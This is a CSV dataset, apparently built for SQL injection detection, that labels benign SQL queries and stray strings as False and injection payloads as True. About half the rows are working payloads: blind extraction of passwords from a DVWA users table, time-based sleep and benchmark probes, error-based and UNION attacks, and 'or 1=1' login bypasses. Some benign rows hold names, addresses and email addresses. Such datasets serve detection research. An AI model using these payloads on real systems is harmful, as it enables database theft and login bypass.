Query,SQLIA
"INSERT INTO weight  ( remain, select, distant )  VALUES  ( 'shut', 'create', 'tribe' )  ",False
FROM  ( SELECT DISTINCT bark FROM older ) ,False
SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLY,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),12,1))>60 AND 'TkwJ'='TkwJ",True
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble',False
"calle las artes, 90,",False
SELECT COUNT ( wise )  FROM dozen,False
SELECT * FROM  ( SELECT wrapped FROM recall ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),13,1))>104 AND 'Tfyt'='Tfyt",True
"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",True
" select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",True
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",True
"-1908""   )    )    union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",True
"-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",True
pesado,False
SELECT * FROM knife WHERE action NOT LIKE 'atmosphere%',False
"calle ginebra, 138",False
"  SELECT * FROM good WHERE at NOT IN  ( 'share', 'kids', 'frozen' )  ",False
reconfortante,False
"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",True
1'   )    )    as gfzb where 7904  =  7904,True
"1'  )   and make_set  (  8403  =  8403,8899  )  ",True
4.43607E+15,False
" SELECT * FROM arrow ORDER BY mud ASC, past DESC",False
-8274'   )    )    union all select 3048--,True
"1""  )   union all select null,null,null,null,null,null,null,null,null,null#",True
1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,True
"INSERT INTO increase ( company, college, introduced, rain, metal, mood )  VALUES  ( 'bowl', 'once'. second', 'him', 'ask', 'length', 'upward' )  ",False
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",True
SELECT support ( s )  FROM new FULL OUTER JOIN,False
lleida,False
"  SELECT enemyID AS ID, kill AS ride FROM dollar",False
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",True
van_eyk,False
SELECT TOP 3 * FROM steep WHERE off = 'captain',False
5.56878E+15,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 0,1),8,1))>93 AND 'lHsL'='lHsL",True
6015,False
vada,False
"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy",True
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",True
SELECT COUNT ( numeral ) FROM breeze,False
estival,False
end and    (    (   'eqoc' like 'eqoc,True
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_1_text' LIMIT 1,False
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",True
SELECT * FROM object WHERE farm BETWEEN '1996-07-01' AND '1996-07-31',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 6,1),1,1))>106 AND 'zFnD'='zFnD",True
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",True
"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",True
nelia3,False
DELETE FROM citizen,False
-2951 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # gwqv,True
1' OR NOT 86=86 AND 'xAdf'='xAdf,True
 UPDATE broken SET may = 'universe'WHERE managed = 'dress',False
mocej*n,False
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',False
"  SELECT dug,pole FROM art WHERE using = 'lying' UNION SELECT total, thrown FROM friendly",False
"   SELECT COUNT ( heard ) , floating FROM harder BY difficult",False
"-2190'  )   where 8890  =  8890 union all select 8890,8890#",True
" SELECT * FROM whom ORDER BY clearly, element",False
carceln,False
tomi,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 2,1),7,1))>97 AND 'WZxa'='WZxa",True
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",True
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",True
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
 UPDATE paper SET damage = 'stood'WHERE behavior = 'drawn',False
"1""  )   as iwri where 4921  =  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",True
SELECT AVG ( bank ) FROM mother,False
"   SELECT cent, cool, bareFROM anybody WHERE drop  IS NOT NULL",False
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 6,1),1,1))>108 AND 'zFnD'='zFnD",True
SELECT * FROM  ( SELECT soap FROM exactly ) ,False
SELECT * FROM  ( SELECT basic FROM ever ) ,False
credido poma,False
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",True
"  SELECT * FROM spite WHERE strong IN  ( 'blood', 'ancient', 'slight' )  ",False
"1"" where 4319  =  4319",True
tro8e0e1!0,False
"1 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 3,1),2,1))>112 AND 'KPyE'='KPyE",True
SELECT load ( s )  FROM measure LEFT JOIN,False
2138,False
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",True
"iif  (  7036  =  2370,1,1/0  )  ",True
"   SELECT COUNT ( song ) , exactly FROM out BY ate",False
"   SELECT COUNT ( universe ) , hungry FROM log BY stretch",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),15,1))>45 AND 'hBNb'='hBNb",True
 or true--,True
"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",True
SELECT COUNT ( earlier )  FROM experience,False
travs elias,False
39699852n,False
"avda. de pablo iglesias, s/n 2?g",False
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',True
1  )   where 3979  =  3979 rlike sleep  (  5  )  --,True
"-6996%"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",True
SELECT * FROM breath FETCH FIRST 50 PERCENT ROWS ONLY,False
SELECT * FROM rubbed WHERE two  BETWEEN 10 AND 20,False
SELECT * FROM  ( SELECT care FROM yesterday ) ,False
m601c1te,False
1' OR NOT 56=56 AND 'iyKm'='iyKm,True
vilar elsegui,False
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2691' LIMIT 1,False
champ,False
claros lafragueta,False
1 OR NOT 2570=5761-- oVgP,True
SELECT MIN ( swim )  AS evening FROM breathe,False
"INSERT INTO which ( mile, friend, finish, monkey, word, then )  VALUES  ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )  ",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>67 AND 'CoVr'='CoVr",True
cortada mercader,False
SELECT buy ( s )  FROM call UNION,False
SELECT COUNT ( natural ) FROM something,False
 UPDATE vapor SET alone = 'how'WHERE gate = 'acres',False
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",True
SELECT * FROM among WHERE popular = 'common'  AND  ( leather = 'friend' OR bent = 'somebody' ) ,False
SELECT entire,False
"1 where 7642  =  7642 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",True
SELECT * FROM older WHERE NOT regular = 'lead'  AND NOT clearly = 'straw',False
"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",True
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,True
"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),20,1))>115 AND 'TszS'='TszS",True
"-5210""  )   where 7176  =  7176 or 6872  =  6872--",True
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",True
SELECT DISTINCT badly FROM pot,False
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),4,1))>47 AND 'Tfyt'='Tfyt",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),7,1))>110 AND 'KwMp'='KwMp",True
DELETE FROM raise WHERE value = 'clock',False
"1%""   )    )    and 9198  =  9198--",True
doroteya,False
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",True
SELECT AVG ( Price ) FROM day,False
velen,False
mendracaveitia torreyas,False
"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",True
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'tvcm'  =  'tvcm",True
SELECT wing ( s FROM satisfied RIGHT JOIN,False
SELECT TOP 3 * FROM practice,False
SELECT CHAR_LENGTH ( CustomerName )  AS LengthOfName FROM Customers;,False
SELECT * FROM mirror 3 SELECT * FROM pen,False
volkmann_parfrey1@sigloventidos.be,False
"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",True
SELECT * FROM should WHERE spell BETWEEN '1996-07-01' AND '1996-07-31',False
argelio,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),2,1))>64 AND 'CRxB'='CRxB",True
SELECT vote FROM strange,False
SELECT * FROM consonant WHERE using LIKE '%book%',False
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,True
-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,True
712,False
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",True
SELECT * FROM column  WHERE star NOT LIKE '[drawn]%',False
SELECT atmosphere ( s )  FROM trap UNION,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),7,1))>112 AND 'ESxF'='ESxF",True
"1""   )    )     )   union all select null#",True
SELECT * FROM younger WHERE teach = 'could',False
SELECT * FROM instant WHERE forgotten LIKE '%third%',False
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv",True
digott_sims@enigmatico.ar,False
"1'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",True
mohar@ropadegolf.gg,False
"1%'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",True
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",True
gula,False
admin' or 1  =  1,True
SELECT TOP 3 * FROM crop WHERE further = 'minerals' SELECT * FROM involved,False
SELECT * FROM mixture  WHERE opportunity NOT LIKE '[mother]%',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 6,1),10,1))>108 AND 'zFnD'='zFnD",True
SELECT * FROM happen WHERE golden = 'worth'  AND  ( tight = 'carefully' OR wide = 'sheet' ) ,False
"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",True
SELECT * FROM surface WHERE trap = 'iron',False
16452,False
"SELECT LOWER ( ""SQL Tutorial is FUN!"" ) ; ",False
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""kbex"" like ""kbex",True
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",True
SELECT * FROM principal WHERE case = 'poor',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>49 AND 'vyMm'='vyMm",True
novalbos illarraga,False
1' and 1541  =  6868#,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>52 AND 'CoVr'='CoVr",True
SELECT TOP 3 * FROM paint WHERE change = 'metal',False
chao-pin2,False
37246742j,False
"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """,True
SELECT TOP 50 PERCENT * FROM distance SELECT * FROM effort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM measure,False
96622444l,False
1'  )   where 6622  =  6622 order by 1--,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>64 AND 'ZLDU'='ZLDU",True
SELECT * FROM sell WHERE money = 'noted',False
"  SELECT catID AS ID, football AS held FROM plates",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),22,1))>56 AND 'epJT'='epJT",True
 UPDATE airplane SET question = 'first'WHERE basket = 'colony',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),1,1))>77 AND 'ybro'='ybro",True
"1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",True
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx",True
SELECT COUNT ( just )  FROM shoe,False
-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,True
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",True
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb",True
SELECT * FROM active WHERE thing BETWEEN sail09/01/1996careful AND birthday15/31/1996examine,False
SELECT COUNT ( escape ) FROM offer,False
priaranza del bierzo,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),2,1))>104 AND 'dJCv'='dJCv",True
SELECT plate FROM ability UNION ALL SELECT canal FROM sum ORDER BY slip,False
lahnstein agundis,False
22532,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`name` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),2,1))>112 AND 'BKcK'='BKcK",True
longhurst-street1@drae2.pa,False
SELECT * FROM scientific,False
1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,True
SELECT COUNT ( DISTINCT Country )  FROM Customers;,False
"ALTER table zcf_zohocrmform_field_manager MODIFY module_type varchar ( 255 ) ,MODIFY base_model varchar ( 255 ) ,MODIFY field_label varchar ( 255 ) ,MODIFY field_name varchar ( 255 ) ",False
98970543w,False
7311,False
SELECT * FROM interest WHERE    NOT condition = 'section',False
SELECT AVG ( food ) FROM sit SELECT SUM ( wave ) ,False
cholewin,False
1 WHERE 6176=6176 AND 9820=9820-- HUzt,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),3,1))>49 AND 'bSNt'='bSNt",True
SELECT writer ( s FROM black RIGHT JOIN,False
"  UPDATE appearance SET forget =  'gasoline', City =  'properly' WHERE usual =  enemy",False
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",True
SELECT * FROM board  WHERE eleven = expression,False
SELECT TOP 3 * FROM heavy SELECT * FROM slept 3SELECT * FROM pleasant,False
select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,True
"1%'  )   union all select null,null,null,null,null,null,null,null,null--",True
1' where 8469  =  8469,True
SELECT AVG ( sport ) FROM facing,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),4,1))>99 AND 'MlAj'='MlAj",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),1,1))>49 AND 'bSNt'='bSNt",True
SELECT COUNT ( sillyID ) FROM tide,False
SELECT * FROM they WHERE element LIKE '%luck%',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),10,1))>67 AND 'JUqW'='JUqW",True
soussa,False
SELECT * FROM body WHERE completely BETWEEN '1996-07-01' AND '1996-07-31',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),4,1))>97 AND 'dJCv'='dJCv",True
1'  )   as bihs where 4197  =  4197,True
SELECT TOP 3 * FROM within SELECT * FROM soil 3SELECT * FROM white,False
SELECT * FROM neighborhood WHERE teeth IN  ( SELECT island FROM warm ) ,False
DELETE FROM satellites,False
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",True
"1%""   )    )    and 4595  =  4595#",True
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>1 AND 'znpp'='znpp",True
FROM  ( SELECT DISTINCT strange FROM area ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),15,1))>36 AND 'IlVZ'='IlVZ",True
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",True
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",True
"INSERT INTO lying  ( border, vast, tune )  VALUES  ( 'longer', 'movement', 'dirt' )  ",False
SELECT * FROM feed WHERE decide = 'promised' FETCH FIRST 3 ROWS ONLY,False
SELECT TOP 50 PERCENT * FROM tin SELECT * FROM here FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM result,False
molledo basagaa,False
97428124d,False
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",True
"-6335""   )    )     )   union all select 3654--",True
-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,True
ikediek torrades,False
"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",True
SELECT COUNT ( map ) FROM buy,False
SELECT * FROM front,False
SELECT * FROM alone WHERE    NOT kitchen = 'or',False
 ',True
"-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  '",True
SELECT metal FROM certain UNION ALL SELECT twenty FROM seat ORDER BY probably,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),25,1))>112 AND 'stCx'='stCx",True
SELECT * FROM rod  WHERE appearance = conversation,False
"1%'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",True
SELECT DISTINCT cattle FROM near,False
"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",True
ibero saborit,False
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",True
"-9434""  )   as cqlw where 1600  =  1600 or 2733  =  1047--",True
"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",True
"""   )    )   ;waitfor delay '0:0:__TIME__'--",True
" SELECT column_name ( s )  FROM parallel,kind",False
"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",True
cusanelli@wdsl.ao,False
SELECT * FROM same WHERE    NOT simply = 'south',False
SELECT option_value FROM wp_options WHERE option_name  =  'ReduxFrameworkPlugin' LIMIT 1,False
SELECT * FROM knew WHERE    NOT maybe = 'gray',False
beckwith,False
SELECT option_value FROM wp_options WHERE option_name  =  'options_site_logo' LIMIT 1,False
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",True
"calle miquel santandreu 66,",False
SELECT * FROM whistle WHERE some = 'door',False
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,True
SELECT * FROM troops FETCH FIRST 50 PERCENT ROWS ONLY,False
lacalle jambrina,False
"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",True
""" or """" """,True
ensminge,False
"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),2,1))>107 AND 'TkwJ'='TkwJ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),5,1))>35 AND 'yuzR'='yuzR",True
"SELECT * FROM put WHERE copper BETWEEN ""according"" AND    ""cream""",False
"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",True
SELECT TOP 3 * FROM select WHERE business = 'poetry' SELECT * FROM improve,False
